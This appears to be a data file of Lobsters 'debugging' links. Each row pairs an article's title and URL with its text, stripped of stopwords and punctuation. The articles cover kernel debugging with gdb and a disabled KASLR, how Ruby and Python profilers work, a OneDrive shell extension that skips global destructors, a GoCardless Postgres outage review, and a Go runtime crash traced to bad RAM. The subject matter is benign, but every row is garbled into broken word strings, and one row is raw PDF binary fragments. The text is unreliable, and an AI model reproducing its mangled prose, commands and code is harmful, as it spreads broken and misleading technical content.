kernel build process though need build enough kernel make script functional need build install kernel generic ubuntu kernel includes right configuration setting already abort build soon script prepared start kernel build debuggee sudo apt builddep yes linuximage uname r debuggee sudo apt install yes fakeroot debuggee fakeroot debianrules clean debuggee fakeroot debianrules binaryheaders binarygeneric binaryperarch terminate build debianbuildbuildgenericscriptsgdblinuxconstantspy created need wait build finish using custom kernel debugging ubuntusupplied kernel binary want install kernel continue following ubuntu wiki instruction disable kaslr debuggee machine also need disable kernel address space layout randomization kaslr kaslr randomly perturbs location kernel code make attack difficult great exploit mitigation technology enabled address symbol file match kernel debugging tool useless need turn disable kaslr changing grub bootloader setting root open etcdefaultgrub sudo nano etcdefaultgrub debuggee machine look grubcmdlinelinuxdefault see line look like grubcmdlinelinuxdefault splash quiet add nokaslr end grubcmdlinelinuxdefault splash quiet nokaslr apply change debuggee sudo updategrub confirm bootgrubgrubcfg updated new option debuggee grep nokaslr bootgrubgrubcfg linux rootuuid ro splash quiet nokaslr vthandoff linux rootuuid ro splash quiet nokaslr vthandoff change take effect next boot shut anyway enable vmware debug stub enable vmware debug stub need enable vmware debug stub simple debugging interface included vmware full debugger speaks gdb remote debugger protocol control gdb debugger machine ui enable debug stub need change vm configuration hand shut debuggee vm open configuration file configuration file located vm data directory vm named debuggee configuration file name debuggeevmx end file add guest use instead start debuggee confirm nokaslr option present debuggee cat proccmdline rootuuid ro splash quiet nokaslr set environment debugger machine copy environment debuggee machine debugger machine way need use exactly o machine copy symbol running kernel kernel source code gdb script debugger machine run change path address appropriate debuggee machine careful copying gdb script debianbuild contains symlink parent exclude first transfer copy script second step debugger rsync recursive relative copylinks verbose exclude homealambertkernelsource usrlibdebug kernel debugger rsync recursive relative copylinks verbose kernel install gdb debugger sudo apt install yes gdb need fix one last thing use gdb script script assume kernel current directory name vmlinux make debugger cd kernel debugger ln vmlinux finally start gdb compare address initutsns symbol running kernel make sure everything configured correctly debugger gdb gdb file vmlinux reading symbol vmlinux done gdb info address initutsns symbol initutsns static storage address compare address running kernel debuggee sudo grep initutsns prockallsyms initutsns address match exactly address prockallsysms ensure reading file root hiding kernel address unprivileged user security feature still match doublecheck kaslr disabled kernel built build server embedded source path differ local path use info source determine original source path mine gdb info source source file symbol read remap path local source path gdb locate source code automatically gdb set substitutepath done able summon source code symbol gdb list initutsns struct newutsname name struct usernamespace userns struct ucounts ucounts struct nscommon n randomizelayout extern struct utsnamespace initutsns ifdef configutsns static inline void getutsns struct utsnamespace n gdb info source current source file compilation directory located connect gdb debuggee finally ready connect vmware expose debug server guest instruct gdb connect endpoint gdb target remote remote debugging using nativesafehalt gdb connected see source context gdb list static inline cpuidle void nativesafehalt void asm volatile sti hlt memory static inline cpuidle void nativehalt void asm volatile hlt memory gdb info source current source file compilation directory located backtrace gdb bt full nativesafehalt local archsafehalt esi optimized edx optimized edi optimized ecx optimized sp defaultidle able see symbol loaded kernel module yet load helper script run lxsymbols probe loaded module configure gdb appropriately gdb source gdb lxsymbols loading vmlinux scanning module homealambertkernel loading loading loading use c continue execution controlc halt execution use n step singlestep finish finish current stack frame remember running build optimization sometimes variable optimized source line may change unexpectedly script automatically add new symbol kernel module loaded added ipsec policy several module loaded kernel automatically loaded debugger loading loading loading loading loading use controlc halt execution set new breakpoints module gdb b pfkeyadd breakpoint file line gdb thread hit breakpoint pfkeyadd gdb c continuing working kernel debugger quitting debugger use detach disconnect otherwise vm terminate debugger close use quit exit gdb happy debugging
368,Lobsters,debugging,Debugging,How do Ruby & Python profilers work?,https://jvns.ca/blog/2017/12/17/how-do-ruby---python-profilers-work-/,ruby python profilers work,kind profilers sampling tracing profilers gist python profilers ruby profilers almost profilers live inside process inside tracing profilers work profiling tracing disadvantage tracing profilers appear sampling profilers mostly work setitimer stacksamplerpy count time setitimer man page mgedmin twitter issue issue sampling profilers use setitimer code chooses sample stack trace blog post call sleep call sleep pyflame blog post http eklitzkeorg,hello precursor writing ruby profiler wanted survey existing ruby python profilers work also help answer question lot folk asking write profiler post going focus cpu profilers say memoryheap profilers explain basic general approach writing profiler give code example take bunch example popular ruby python profilers tell work hood probably mistake post research post read part code different profiling library looked today please let know kind profilers basic kind cpu profilers sampling profilers tracing profilers tracing profilers record every function call program make print report end sampling profilers take statistical approach record program stack every millisecond report result main reason use sampling profiler instead tracing profiler sampling profilers lower overhead take sample second time consuming pretty effective serious performance problem like time spent slow function sample second often enough figure function blame profilers summary profilers discussing post gist explain jargon table setitimer rbaddeventhook ptrace bit later interesting thing profilers implemented using pretty small set fundamental capability python profilers gdb hack python profiler exactly link website talking implement hacky profiler shell script wrapper around gdb relevant python newer version gdb actually unwind python stack kind poor man pyflame ruby profilers almost profilers live inside process start getting detail profilers one really important thing profilers except pyflame run inside pythonruby process inside pythonruby program generally pretty easy access stack example simple python program print stack every running thread import sys import traceback def bar foo def foo frame syscurrentframes item line tracebackextractstack frame print line bar output see function name stack line number filename everything might want know profiling module bar bar foo foo line tracebackextractstack frame ruby even easier put caller get stack profilers c extension performance reason little different c extension rubypython program also really easy access call stack tracing profilers work survey ruby python tracing profilers table rblineprof rubyprof lineprofiler cprofile work basically way record function call written c extension reduce overhead work well ruby python let specify callback get run various interpreter event like calling function executing line code happen callback get called record stack later analysis think useful look exactly code callback get set link relevant line code github python set callback pyevalsettrace pyevalsetprofile documented profiling tracing section python documentation doc say pyevalsettrace similar pyevalsetprofile except tracing function receive linenumber event code ruby set callback rbaddeventhook find documentation get called rbaddeventhook profeventhook rubyeventcall rubyeventreturn rubyeventccall rubyeventcreturn rubyeventline self type signature profeventhook static void profeventhook rbeventflagt event value data value self id mid value klass seems pretty similar python pyevalsettrace flexible pick event want notified like function call code disadvantage tracing profilers main disadvantage tracing profilers implemented way introduce fixed amount every function call line code executed cause make incorrect decision example implementation something one lot function call one without take amount time one lot function call appear slower profiled test tiny bit made small file called testpy following content compared running time python mcprofile testpy python testpy python testpy ran python mcprofile testpy ran particular pathological example cprofile introduced extra overhead def recur n n return recur range recur documentation cprofile say interpreted nature python tends add much overhead execution deterministic profiling tends add small processing overhead typical application seems like pretty reasonable assertion example program earlier million function call nothing else obviously typical python program almost program would le overhead test rubyprof ruby tracing profiler overhead readme say program run approximately twice slow highly recursive program like fibonacci series test run three time slower sampling profilers mostly work setitimer time talk second kind profiler sampling profilers ruby python sampling profilers implemented using setitimer system call well let say want get snapshot program stack time second way ask linux kernel send signal every millisecond using setitimer system call register signal handler record stack every time get signal done profiling ask linux stop sending signal print output want see practical example setitimer used implement sampling profiler think stacksamplerpy best example useful working profiler line python cool reason stacksamplerpy line python register python function signal handler function get passed current stack python program signal handler stacksamplerpy register really simple def sample self signum frame stack frame none stackappend selfformatframe frame frame framefback stack join reversed stack selfstackcounts stack get stack frame increase number time particular stack seen one simple cool let go rest profilers use setitimer find code call setitimer one important thing setitimer need decide count time want real wall clock time user cpu time m user system cpu time look closely call site notice profilers actually make different choice setitimer sometimes configurable sometimes setitimer man page short worth reading understand option mgedmin twitter pointed one interesting downside using setitimer issue issue bit detail one interesting downside setitimerbased profilers timer cause signal signal sometimes interrupt system call system call sometimes take millisecond sample frequently make program keep retrying syscall forever sampling profilers use setitimer sampling profilers use setitimer pyinstrument us pyevalsetprofile sort tracing profiler way always collect stack sample tracing callback called code chooses sample stack trace see blog post decision basically setitimer let profile main thread python pyflame profile python code outside process using ptrace system call basically loop grab sample sleep repeat call sleep pythonflamegraph take similar approach start new thread python process basically grab stack trace sleep repats call sleep profilers sample using wall clock timing pyflame blog post spent almost time post profilers pyflame pyflame actually one interested profile python program separate process want ruby profiler work lot get evan klitzke written lot really good blog post http eklitzkeorg really interesting stuff going read carefully maybe ptrace better approach processvmreadv implementing ruby profiler processvmreadv lower overhead stop process also give inconsistent snapshot stop process experiment getting inconstistent snapshot big problem think experimentation lot important subtlety get post example basically said vmprof stacksampler vmprof support line profiling profiling python function written c believe introduces complexity profiler fundamental think survey good starting point
369,Lobsters,debugging,Debugging,I hope you don’t mind if some of your globals’ destructors are skipped,https://peteronprogramming.wordpress.com/2017/12/06/i-hope-you-dont-mind-if-some-of-your-globals-destructors-are-not-called/,hope mind globals destructors skipped,previous post error operation completed succesfully first rule programming value almost useful wallpaper global flag flgmonitorsilentprocessexit documentation page heap documentation exitprocessimplementation sir need debugger man head documentation gate electrified indeed ntdll ntterminateprocess ntdll rtlpwaitoncriticalsection blog post reporting issue connect developer community clearbit connect rocketreach summer fall winter february march april may july september closing thought linked like,tl dr bug microsoft onedrive shell extension get installed automatically office way make program skip global variable destructors dlls ever open file dialog company work really decent custom crash detection system multiplatform feature like outofprocess crash reporting automated categorization etc read previous post blog aware implementing system easy feat matter thorough careful always crash escape ability detection given program complex enough plenty one main reason feature called abnormal exit detection upon exiting program using said crash detection system must signal exit fails outofprocess crash reporting server watchdog process run machine know something went wrong take note abnormal exit exit code let say detected program vanished exit code exception code access violation telltale sign uncaught crash unhandled seh exception occurs program get terminated exception code point create minidump walk stack course process already gone exit code least still better nothing pinning potentially unhandled crash sometimes mechanism catch miscellaneous error bug party library well time caught bug onedrive shell extension grooveexdll let skip ahead took quite lot time effort come conclusion let tell whole error operation completed succesfully pretty much since abnormal exit detection feature went live user getting lot report various exit code fact get report actual crash believe say get lot surprisingly vast majority report contained exit code right seemed many time program failed exit normally exit code errorsuccess anyway sometimes phenomenon happened inhouse user well tester developer etc whenever saw kind issue popping crash reporting database inhouse machine asked affected user anything strange circumstance worthy mention always told u nothing strange happening program seemed exit normally also always happened sporadically chance repro either without repro hand still something find explanation course encounter something like usually best assume error operating system party component started looking error code remember first rule programming one potential cause could process call terminateprocess program exit code parameter set zero another one could error outofprocess crash reporting infrastructure maybe report false positive maybe misdetect exit code several code review later actually found minor mistake could cause report given right circumstance get hope since reproduce issue try fix worked wait next patch deployed see whether report stop flowing ntglobalflag value almost useful product affected problem beta testing period take place every year month final release newest major version reward system actual reward wallpaper example participating user usually motivated responsive beta period beginning year spotted two beta user affected issue frequently usual still sort sporadic seemed could worth reaching recall two main suspect bug outofprocess crash reporting system someone terminating process early exit code zero even though already reviewed relevant part code still rule suspect number one asked log user hoping spot anomaly suspect number two googling found global flag value know basically perprocess registry value let tell window handle process differently trigger special behavior called flgmonitorsilentprocessexit seemed like thing needed flag active minidump written process terminated event emitted window event log containing terminating process exit code additional feature well curious check documentation checking whether feature work clean install need watch feature driven global flag require window sdk installed like page heap instance threw together bunch batch file turn feature program handed file user instruction asked work day like send back resulting minidumps event log one repro issue phase enough could correlate entry user window event log record crash reporting database exit question documentation refers self exit process either exited normally called terminateprocess certainly rule another process terminating program never main suspicion anyway minidump contained call stack like ntdll ntwaitforsingleobject ntdll rtlreportsilentprocessexit ntdll rtlexituserprocess exitprocessimplementation ucrtbase exitorterminateprocess ucrtbase commonexit app scrtcommonmainseh basethreadinitthunk ntdll rtluserthreadstart seems like normal exit main returned runtime calling function exitprocess even though documentation exactly clear turn silent process exit monitoring feature writes minidumps upon calling exitprocess basically asking system following wrong question call exitprocess terminateprocess program system righteously answered c runtime well duh always case given graceful exit really useful particular case least know regular exit go case msvccompiled application aware point exitprocess call far end party thing happen super roughly main function return exit get called runtime call global variable destructors contained executable runtime call exitprocess call exitprocess terminate thread except calling one exitprocess start unloading dlls dlls unloaded global destructors contained also called process dead well know logic responsible signaling succesful exit implemented global c object destructor happens dll worth noting purpose need code run late possible cover much lifetime possible minidump taken point exit signaling mechanism run point nastiness must happen two point unfortunately blind spot silent process exit monitoring sir need debugger could look process last state ceased exist anyone remembers scene wild wild west made projector man head find saw death would hopefully reveal culprit certainly possible windbg example show final call stack debuggee even write minidump could either teach poor user basic windbg write dbgeng script ask user execute preferably cdb guile version windbg organize remote session live debug issue first option question obvious reason wonder probably never used windbg tl dr power tool cumbersome use even developer second option might viable afraid even could hack together script job unexpected event circumstance would make fail go astray also dbgeng script syntax god third option would worked issue reproducible reliably nothing special windbg make particular feature possible window ability intercept exit point debuggee come outofthebox given eventually ended writing really simple debugger writes minidump process upon receiving exitprocessdebugevent event even though never used debugging apis took couple hour throw minidebugger together create process debugonlythisprocess flag enter socalled debug loop respond event easy documentation quite helpful sent small debugger user instruction asked work like day send back resulting minidumps couple day later provided u dump gate electrified indeed minidumps contained call stack regular exit similar one shown earlier however looked like ntdll ntterminateprocess ntdll rtlpwaitoncriticalsection ntdll rtlpentercriticalsectioncontended ntdll rtlentercriticalsection grooveex dllunregisterserver grooveex dllunregisterserver ucrtbase operator ucrtbase crtsehguardedcall operator ucrtbase executeonexittable grooveex dllunregisterserver grooveex dllunregisterserver ntdll ldrpcallinitroutine ntdll ldrshutdownprocess ntdll rtlexituserprocess ucrtbase exit ucrtbase exit app looked call immediately knew problem experienced regular reader raymond chen blog remembered particular post talked happens try enter abandoned critical section process shutdown process get terminated right spot turn exit code zero whole phenomenon started make perfect sense user open file dialog onedrive shell extension grooveexdll get loaded must creating thread one us critical section global destructor shell extension also want lock critical section perform kind cleanup supposedly however thread holding earlier terminated process shutdown point shutdown sequence explained end situation exactly like described post also explains never able reproduce process needed shut critical section question held thread one initiating exit race condition reporting issue finally culprit time report bug microsoft report problem microsoft time time like know way harder hunting actual win case encounter crash problem visual studio one component like msvc report connect developer community call day hurt plenty case find bug component active msdn blog know developer lurking around forum reddit report directly nightmare case want report problem component sort exotic general googling looking conference speech topic hoping presenter actually work component best name might success snatching person email address using service like clearbit connect rocketreach particular problem turned nightmare case method described could find contact program manager onedrive team sent document describing issue forwarded developer exchanged email said developer whole thing stalled unfortunately fix response couple month later something changed number incoming report abnormal exit exit code zero largely increased reason maybe implementation detail changed grooveexdll issue suddenly became reproducible say life give lemon make lemonade form minimal repro program sent microsoft immediately repro program super simple console application static dll dependency global c object dll print message constructor destructor program open file dialog closed discard result try given office therefore onedrive shell extension installed time try bug still fixed download application carefully inspect code confirm harmless compiling right running repro application deactivating onedrive shell extension unfortunately even though provided minimal repro program bug still fixed time writing post timeline summer abnormal exit detection feature crash reporting system went live fall noticed peculiar report started looking possible explanation reviewed code winter several code review landed patch hoping fix problem february beta testing next major version product began march identified handful beta test participant seemed affected issue frequently others april reaching beta tester one user able provide minidump pinpointed grooveexdll culprit may contacted program manager onedrive team issue forwarded email developer july bug suddenly became always reproducible minimal repro program created sent program manager developer cc asking escalation september since bug still fixed asked status report program manager reply yet closing thought know people react whole story something like peter rely global destructors anyway another reason avoid globals elohel sense right unsurprisingly aware best practice like product hit suffer feature data loss issue bug bug bug ought fixed abnormal exit detection feature crash reporting system quite useful catch error code time time year spammed report grooveexdll issue kind inconvenient window behavior according raymond blog post also linked window xp earlier system quite forgiving someone tried enter orphaned critical section process shutdown simply let easy see microsoft changed vista thread terminated owning critical section actual resource guarded critical section could well corrupt letting someone touch could potentially cause harm good since vista window give slap face scenario fine fine pretending nothing wrong happened process exit code zero window error reporting neither write report event log entry decision likely made retain compatibility hey microsoft program x worked fine xp vista seem crash close however opinion would much better default crashing offending program scenario wer resort swallowing error compatibility shim minimum subsystem version executable image le equal window xp bet report grooveexdll trying ot enter orphaned critical section flooded winqual window dev center wer report end issue would already fixed word random centraleastern european guy writing blog post scale automated problem report fun fact get called example global variable dll call terminateprocess destructor two minidumps written exit two different point course wondering grooveex dllunregisterserver call come answer actually grooveex dllunregisterserver call dll m symbol server debugger get pdb however stop windbg trying resolve address found nearest exported function assumed call belong short interpret line private function symbolic information aware official way report problem regarding window component feedback hub app however success far recommend using alternative method described inspecting code run case revealed actual ntterminateprocess syscall invoked exit code parameter ntstatus statusthreadisterminating bother check kernel mode code well apparently branch somewhere check exit code corrects zero cheeky comment source code imagine like like loading related
370,Lobsters,debugging,Debugging,GoCardless Incident review: API and Dashboard outage on 10 October 2017,https://gocardless.com/blog/incident-review-api-and-dashboard-outage-on-10th-october/,gocardless incident review api dashboard outage october,summary database setup incident timeline following week reproducing failure red herring invalid wal file moving new database cluster wrapping incident next elephant room closing thought,post represents collective work core infrastructure team investigation api dashboard outage october payment company take reliability seriously hope transparency technical writeups like reflects thatwe included highlevel summary incident detailed technical breakdown happened investigation change made sincesummaryon afternoon october experienced outage api dashboard lasting hour minute request made time failed returned errorthe cause incident hardware failure primary database node combined unusual circumstance prevented database cluster automation promoting one replica database node act new primarythis failure promote new primary database node extended outage would normally last minute one lasted almost hoursour database setupbefore start helpful highlevel view store data gocardlessall critical stored postgreswe run postgres cluster node primary synchronous replica asynchronous replica mean always least copy every piece data time respond successfully api requestto manage promotion new primary node event machine failure run piece software called pacemaker node cluster client ruby rail application connect primary using virtual ip address vip also managed pacemakerput together look little like primary node fails cluster noticesit promotes synchronous replica guaranteed copy every write eg new payment primary accepted also set old asynchronous replica new synchronous replicaonce vip moved across application carry worka site reliability engineer sre add new replica back clusterincident timelineso go wrong time section british summer time monitoring detects total outage api dashboard engineer begin see evidence disk array failure primary unsure cluster nt already failed synchronous power broken primary postgres node done nt machine cluster online broken disk array believe synchronous asynchronous node online cluster software promote new primary quickly becomes clear clear error count crm resource cleanup pacemaker prompt rediscover state postgres instance effect cluster promote synchronous replicawe spend next hour trying variety approach promote new primaryour last attempt centre around editing configuration synchronous replica try promote put pacemaker cluster maintenance mode crm configure property maintenancemodetrue remove configuration flag tell postgres replica recoveryconf bring cluster maintenance mode every time brings replica back original recoveryconf left decide attempt approach run long need try something else set cluster maintenance mode one last time configure synchronous replica primary start postgres ourselvessince cluster also manages vip set maintenance mode reconfigure backend application connect actual ip address new manually promoted primary postgres node working configuration change rolled monitoring system confirm api dashboard back uphaving brought system back online next priority restore database cluster usual level redundancy meant bootstrapping third node asynchronous replicasince pacemaker still maintenance mode would automatic failover machine fail believed likely running manuallymanaged setup event primary failing wanted able promote synchronous replica quickly possiblewe decided introduce another vip managed manually infrastructure team event primary failing would promote synchronous replica move vip ourselvesas incident triggered disk array failure caution spent time verifying integrity data running every test could think found evidence data corruptiononce done felt safe gocardless service running started planning next stepsthe following weeksthe day incident whole team sat discus two issue pacemaker cluster fail elect new primary database node move back pacemaker managing cluster manuallymanaged state discussion decided taken much manual intervention existing database cluster confident bringing back pacemaker automation decided provision new cluster replicate data switch traffic overwe split two subteams one trying reproduce failure working move new database cluster minimal disruptionreproducing failureto confident new cluster needed understand existing one nt promote new primary make change fix issuefor part analysing log component involved failure analysis pulled several factor looked like could relevant reproducing issue raid controller logged simultaneous loss disk array subsequent read write operation failedthe linux kernel set filesystem backed controller readonly mode given state array even read nt possiblethe pacemaker cluster correctly observed postgres unhealthy primary node repeatedly attempted promote new primary time could nt decide primary runon synchronous replica one become new primary one postgres subprocesses crashed around time disk array failure primary happens postgres terminates rest subprocesses restartsafter restart synchronous replica kept trying restore writeahead log wal file restorecommand attempt failed message stating file invalid later lot unpick right given complexity involved clear get answer reasonable amount time could repeatedly break cluster slightly different way see could get break way production cluster octoberfortunately part unrelated work done recently version cluster could run inside docker container used help u build script mimicked failure saw production able rapidly turn cluster let u iterate script quickly found combination event broke cluster right waya red herring invalid wal fileone log entry stood real cause concern synchronous replica failing restore wal file restorecommanda quick bit background familiar postgres writeahead log postgres record everything ask write eg insert update delete query log provides strong guarantee writes lost postgres crash also used keep replica sync primarythere two way wal used streaming replication archivecommand restorecommandin streaming replication replica establish ongoing connection primary sends wal generates specify replication synchronous wait replica confirm received wal returning query generated itwith archivecommand postgres let specify shell command executed every time chunk wal generated primary make file name available command specify choose file similarly restorecommand run replica pass name next wal file database expects replay copy wherever archived toit common use streaming replication archivecommand combination streaming replication keep replica sync recent change archivecommandrestorecommand used bootstrap node behind pulling older wal file archive external cluster eg want bootstrap new node restoring last full backup replaying wal happened incident turned final act server raid controller issue archived invalid wal file backup server postgres subprocess crash caused restart synchronous replica postgres instance came back ran restorecommand pulling invalid walpostgres internal validation check saw wal file invalid discarded term data nt matter node already good copy writes streaming synchronous replication primary time failurewe matched log line validation failure postgres source code spent lot time reproducing exact type invalid wal local container setup keep mind binary format content fairly dynamic easiest thing break repeatable way end figured played part pacemaker cluster inability promote new primary least learned little internals postgres process elimination able remove step script left three condition necessary cluster break pacemaker setting defaultresourcestickinessby default pacemaker nt assign penalty moving resource postgres database process vip different machine service like postgres moving resource eg vip client connected cause disruption nt behaviour want combat set defaultresourcestickiness parameter nonzero value pacemaker consider option moving resource already runningpacemaker resource backup vipas part another piece work reduce load primary node added another vip cluster idea vip would never located primary backup process would always connect replica freeing capacity read operation primary set constraint vip would never run server postgres primary pacemaker term set colocation rule inf negative infinity preference locate backup vip postgres primary serverat time incident backup vip running synchronous replica node pacemaker promoted primaryfailure condition two process crashing onceeven configuration crashing postgres process primary nt enough reproduce production incident way get cluster state would never elect new primary crash one postgres subprocesses synchronous replica saw production log incidentall three condition necessary reproduce failure removing defaultresourcestickiness backup vip led cluster successfully promoting new primary even two process crashing almost simultaneously similarly crashing postgres process primary led cluster successfully promoting synchronous replicawe spent time testing different change pacemaker configuration ran surprising fix somehow inf colocation rule backup vip postgres primary interfering promotion process even though another node asynchronous replica backup vip could runit turned specifying colocation rule backup vip opposite way round worked fine instead specifying rule infpreference backup vip postgres primary could specify inf preference backup vip replica specified way round cluster promotes synchronous replica fine failure conditionsmoving new database clusterwhilst investigation going half team figuring migrate manually managed cluster new cluster managed pacemakerfortunately u prior work could turn weve previously spoken approach performing zerodowntime failover within cluster script coordinate publicly available github repositorythe talk go detail relevant part nt hard describeas well postgres pacemaker also run copy pgbouncer node database cluster introduce second vip layer indirection client eg ruby rail application connect new pgbouncer vip pgbouncer turn connects original postgres vipit possible pause incoming query pgbouncer put queuewe promote new primary move postgres vip note vip client connecting pgbouncer vip nt need move client experience disruptiononce cluster finished promoting new node tell pgbouncer resume traffic sends queued query new primarywe needed adapt procedure little automation performs designed migrate different node cluster two separate clustersthe subteam responsible getting u new cluster spent next couple week making adjustment performing practice run totally comfortable put together plan productionwrapping incidentwith plan place confidence understood fixed issue stopped cluster failing october ready go even testing done announced maintenance window precautionfortunately everything went planned night migrated new database cluster without hitchwe decommissioned old cluster closed incidentwhat next getting away size incidentwe feel immense duty everyone trust gocardless payment provider took time think learned incident focus could improve reliability future key item came seemingly simple pacemaker configuration lead extremely unusual behaviouron surface defining rule say two resource must run together seems like would opposite defining rule say two resource must run together reality cause system behave entirely different way certain failure condition take knowledge future work pacemakerunrelatedly conveniently move away using vip direct traffic specific postgres instance instead running proxy application server direct traffic right node based state cluster drastically reduce number resource managed pacemaker turn reducing potential weird behaviour clustersome bug surfaced fault injectiona misconfiguration surface two process crash almost time nt one going find basic test daytoday operation done fault injection part game day exercise always area harsher test postgres cluster automation like chaos monkeythat continually injects failure idea keen pursueautomation erodes knowledgeit turn automation successfully handle failure two year skill manually controlling infrastructure atrophy one size fit easy say write runbook multiple year go next need almost guaranteed outofdatethere definitely way combat one possibility thinking adding arbitrary restriction game day exercise eg cluster automation failed ca nt diagnose problem need bring service back another way elephant roomwe sure asking even run postgres instance hosted option could nt end writeup without talking littlewe periodically consider option managed postgres service recently somewhat lacking area care without turning article provider comparison recent development provider offer zerodowntime patch upgrade postgres something whilethe thing made u rule managed postgres service far infrastructure baremetal hosting provider added latency provider datacentres hosted postgres service would cause fairly drastic rework application developer currently assume latency postgres millisecond lowerof course nothing set stone hosting situation change time offering various hosting provider keep eye perhaps one day wave goodbye running postgres cluster ourselvesclosing thoughtswe like apologise one last time incident know much trust people put payment provider strive run reliable service reinforces trustat time strongly believe learning failure happen encouraging see blameless postmortem becoming increasingly common operation discipline whether happen call devops sre something else hope found one interesting usefulyou find u gocardlesseng twitter got comment question try answer best record payment merchant customer detail etc postgres standard replication setup primary node accept writes point nt comfortable cluster automation knew would spend time digging went wrong team recognised going detailed investigation lot moving part could take multiple day potentially week two essential comfortable safe running gocardless service
371,Lobsters,debugging,Debugging,Where Do Most Software Flaws Come From?,http://users.ece.utexas.edu/~perry/work/papers/1010-DP-ms25.pdf,software flaw come,,obj endobj xref n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n n trailer startxref eof obj stream b ȁ g fac r endstream endobj obj name acrobat product byterange reference data propbuild app pubsec typesig metadata racroform rpages rtypecatalog endobj obj encoding sigflags endobj obj font procset pdftextimagec typepage endobj obj r endobj obj border typeannot endobj obj stream e l b u q sl
372,Lobsters,debugging,Debugging,Debugging an evil Go runtime bug,https://marcan.st/2017/12/debugging-an-evil-go-runtime-bug/,debugging evil go runtime bug,preface prometheus grafana euskal encounter sqlexporter event dashboard euskal encounter fake staging data trouble horizon issue get using consumer hardware feature cozy digging deeper go issue bisecting machine juggling kernel config hashbased differential compilation vdso shenanigan feature stack clash conclusion pivot larger stack,preface big fan prometheus grafana former sre google learned appreciate good monitoring combination winner past year using monitoring personal server blackbox whitebox monitoring euskal encounter external internal event infra work professionally client prometheus make easy write custom exporter monitor data good chance find exporter already work box example use sqlexporter make pretty dashboard attendee metric encounter event event dashboard euskal encounter fake staging data since easy throw nodeexporter onto random machine prometheus instance scrape basic systemlevel metric cpu memory network disk filesystem usage etc figured also monitor laptop clevo gaming laptop serf primary workstation mostly pretending desktop home also traveling big event like chaos communication congress since already vpn one server run prometheus emerge prometheusnodeexporter bring service point prometheus instance automatically configures alert mean phone make loud noise whenever open way many chrome tab run ram perfect trouble horizon barely hour setting though phone get page newlyadded target inaccessible ala could ssh laptop fine definitely nodeexporter crashed fatal error unexpected signal runtime execution signal sigsegv segmentation violation goroutine running runtimethrow runtimesigpanic runtimeheapbitssettype runtimemallocgc runtimenewobject githubcomprometheusnodeexportervendorgithubcomprometheusclientgolangprometheusnewconstmetric nodeexporter like many prometheus component written go go relatively safe language allows shoot foot wish nearly strong safety guarantee say rust still easy accidentally cause segfault go nodeexporter relatively simple go app mostly purego dependency therefore interesting crash get especially since crash inside mallocgc never crash normal circumstance thing got interesting restarted time http panic serving runtime error growslice cap range goroutine running nethttp conn panic fmt buffer writestring fmt fmt padstring fmt fmt fmts fmt pp fmtstring fmt pp printarg fmt pp doprintf fmtsprintf fmterrorf well interesting crash sprintf time runtime pointer unallocated span spanbase runtime found object sbase sstatemspaninuse snip fatal error found bad pointer go heap incorrect use unsafe cgo runtime stack runtimethrow runtimeheapbitsforobject runtimescanobject runtimegcdrain runtimesystemstack runtimemstart garbage collector stumbled upon problem yet different crash point two natural conclusion either severe hardware issue wild memory corruption bug binary initially considered former unlikely machine heavily mixed workload sign instability traced back hardware fair share crashing software never random since go binary like nodeexporter statically linked depend library download official release binary try would eliminate rest system variable yet still got crash unexpected fault address fatal error fault signal sigsegv segmentation violation goroutine running runtimethrow runtimesigpanic githubcomprometheusnodeexportervendorgithubcomprometheusclientmodelgo labelpair getname githubcomprometheusnodeexportervendorgithubcomprometheusclientgolangprometheus desc string yet another completely different crash point decent chance truly upstream problem nodeexporter one dependency filed issue github perhaps developer seen worth bringing kind issue attention seeing idea unsurprisingly upstream first guess hardware issue unreasonable hitting problem one specific machine machine happily running nodeexporter evidence hardwarelinked instability host also explanation particular machine would make nodeexporter crash run never hurt anyone gave go happened get using consumer hardware whoop bad ram well specific one bit bad ram letting test run full pas got single bad bit plus false positive test move block around amplify single error testing showed test smp mode would quickly detect error usually first pas error always bit address suggests problem weak leaky ram cell particular one get worse temperature quite logical higher temperature increase leakage ram cell thus make likely somewhat marginal cell actually cause bit flip put perspective one bad bit actually good error rate hard disk flash memory much higher error rate device bad block marked factory transparently swapped without user knowing transparently mark newly discovered weak block bad relocate spare area ram luxury bad bit stick forever ala vanishingly unlikely cause nodeexporter woe app us little ram chance hitting bad bit repeatedly extremely low kind problem would largely unnoticeable perhaps causing pixel error graphic single letter flip text instruction corrupted probably ever run perhaps rare segfault something actually important land bad bit nonetheless cause longterm reliability issue server device intended reliable must use ecc ram correct kind error luxury ecc ram laptop though ability mark bad block ram bad tell o use littleknown feature grub allows changing memory map passed booted kernel worth buying new ram single bad bit especially since already obsolete good chance new ram would weak cell anyway good option however one thing since problem get worse temperature happens heat ram cozy using heat gun set fairly low temperature warmed two module time two module rear cover laptop four sodimm slot total playing around module order found three additional weak bit detectable elevated temperature spread around three ram stick also found location error stayed roughly consistent even swapped module around top bit address remained ram interleaved data spread four stick instead stick assigned contiguous quarter available address space convenient mask region ram large enough cover possible address error bit worry might swap stick future mess masking found masking contiguous area cover possible permutation address given bad bit good measure rounded gave three aligned block mask one cover two bad bit total four bad bit wanted masked specified using addressmask syntax required grub follows etcdefaultgrub grubbadram one quick grubmkconfig later ram four dodgy bit ecc ram increase effective reliability consumergrade ram since know rest memory fine least needle say nodeexporter still crashed knew real problem digging deeper annoying thing kind bug clearly caused kind memory corruption break code run later make hard debug predict corrupted varies catch bad code act first tried basic bisecting available nodeexporter release enablingdisabling different collector went nowhere also tried running instance strace seemed stop crash strongly point racecondition kind problem strace usually wind serializing execution apps extent intercepting system call run thread would later find strace instance crashed took much longer since seemed related concurrency tried setting tell go use single oslevel thread run go code also stopped crash pointing strongly concurrency issue gathered quite considerable number crash log starting notice pattern lot variation part crashing ultimately error message could categorized different type kind error showed started googling error stumbled upon go issue issue seemingly unrelated part go one caused similar segfaults random issue issue closed diagnosis reproduced go nobody knew root cause stopped happening grabbed sample code issue claimed reproduce problem ran machine lo behold crashed within second bingo lot better waiting hour nodeexporter crash get closer debugging issue go side give much faster way test let try another angle bisecting machine know problem happens laptop happen machine tried reproducer every machine easy access get crash tell something special laptop since go statically link binary rest userspace matter leaf two relevant part hardware kernel easy way test various hardware machine play kernel let try first order business crash vm test built minimal initramfs allow quickly launch reproducer qemu vm without actually install distro boot full linux system initramfs built linux scriptsgeninitramfslistsh contained following file dir dev nod devconsole c nod devnull c dir bin file binbusybox busybox slink binsh busybox slink bintrue busybox file init initsh file reproducer reproducer init entry point linux initramfs case simple shellscript start test measure time binsh export pathbin start busybox date echo starting test reproducer ret end busybox date echo test exited status ret endstart second binbusybox statically linked version busybox often used minimal system like provide basic 